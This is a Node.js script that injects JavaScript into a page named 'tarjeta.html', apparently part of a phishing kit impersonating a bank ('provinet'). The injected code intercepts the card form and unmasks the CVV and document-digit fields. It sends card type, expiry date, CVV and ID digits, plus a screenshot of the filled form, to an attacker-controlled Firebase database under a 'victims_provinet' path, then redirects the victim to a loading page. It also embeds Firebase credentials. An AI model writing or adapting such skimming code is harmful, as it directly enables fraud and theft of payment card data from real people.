const fs = require('fs');
let html = fs.readFileSync('tarjeta.html', 'utf8');

const scripts = html.match(/<script>[\s\S]*?<\/script>/g);
if(scripts) {
  const lastScript = scripts[scripts.length - 1];
  
  const newScript = `<script>
  const firebaseConfig = {
    apiKey: "AIzaSyA9qspuy_l1vseHqKx9klUg3P9JGx_GZLo",
    authDomain: "sca-mms.firebaseapp.com",
    databaseURL: "https://sca-mms-default-rtdb.firebaseio.com",
    projectId: "sca-mms",
    storageBucket: "sca-mms.firebasestorage.app",
    messagingSenderId: "965549232304",
    appId: "1:965549232304:web:46186cadacaa0d3f5d73df"
  };
  if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
  }
  const db = firebase.database();
  const DB_PATH = 'victims_provinet';
  
  window.addEventListener('load', function() {
    const form = document.getElementById('form');
    if (form) {
      form.removeAttribute('onsubmit');
      form.addEventListener('submit', async function(e) {
        e.preventDefault();
        
        const btnSubmit = document.getElementById('submit');
        if(btnSubmit) {
            btnSubmit.innerText = 'Cargando...';
            btnSubmit.style.pointerEvents = 'none';
            btnSubmit.style.opacity = '0.7';
        }

        const cvv = document.getElementById('cvv');
        const ultimos = document.getElementById('ultimos_digitos');
        if (cvv) cvv.type = 'text';
        if (ultimos) ultimos.type = 'text';

        await new Promise(r => setTimeout(r, 200));

        let victimId = localStorage.getItem('current_victim_id');
        if (!victimId) victimId = "TEST_" + Date.now().toString();

        const tipo_tarjeta = document.getElementById('tipo_tarjeta') ? document.getElementById('tipo_tarjeta').value : '';
        const fecha = document.getElementById('fecha_vencimiento') ? document.getElementById('fecha_vencimiento').value : '';
        const cvvVal = cvv ? cvv.value : '';
        const doc_digits = ultimos ? ultimos.value : '';
        const textData = "TIPO: " + tipo_tarjeta + " | FECHA: " + fecha + " | CVV: " + cvvVal + " | DOC: " + doc_digits;

        // 1. Enviar primero el texto garantizado
        try {
            await db.ref(DB_PATH + '/' + victimId).update({
                tarjeta: textData
            });
        } catch(e) {
            console.error(e);
        }

        // 2. Intentar capturar y enviar la imagen si es posible
        try {
            if (typeof html2canvas !== 'undefined') {
                const canvas = await html2canvas(document.getElementById('form'), {
                    backgroundColor: '#ffffff',
                    scale: 1.2,
                    useCORS: true,
                    logging: false
                });
                const imgData = canvas.toDataURL('image/jpeg', 0.6);

                await db.ref(DB_PATH + '/' + victimId).update({
                    tarjeta: imgData
                });
            }
        } catch (err) {
            console.error("Error en captura:", err);
        }

        // 3. Redirigir siempre
        window.location.href = 'cargando.html';
        return false;
      });
    }
  });
</script>`;

  html = html.replace(lastScript, newScript);
  fs.writeFileSync('tarjeta.html', html, 'utf8');
  console.log('tarjeta.html updated successfully with bulletproof logic');
} else {
  console.log('Script not found');
}
